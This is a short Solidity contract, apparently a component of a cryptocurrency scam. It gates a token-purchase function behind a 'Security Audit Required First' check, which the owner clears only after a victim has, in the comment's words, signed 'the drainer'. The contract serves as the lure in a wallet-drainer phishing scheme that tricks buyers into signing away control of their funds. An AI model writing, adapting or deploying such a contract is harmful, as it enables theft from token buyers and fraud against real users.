// J/contracts/Gatekeeper.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Gatekeeper is Ownable {
    IERC20 public targetToken;
    uint256 public price = 0.001 ether;
    bool public publicLive = false;

    // "Verification" mapping used to gatekeep the buy function
    mapping(address => bool) public isVerified;

    constructor(address _token) {
        targetToken = IERC20(_token);
    }

    function setLive(bool _status) external onlyOwner {
        publicLive = _status;
    }

    // The "Buy" function users are trying to call
    function sniperBuy(uint256 amount) external payable {
        require(msg.value >= amount * price, "Insufficient ETH");
        require(isVerified[msg.sender], "Security Audit Required First");
        
        targetToken.transfer(msg.sender, amount);
    }

    // The function that marks them as "Safe" (after they sign the drainer)
    function verifyUser(address user) external onlyOwner {
        isVerified[user] = true;
    }
}
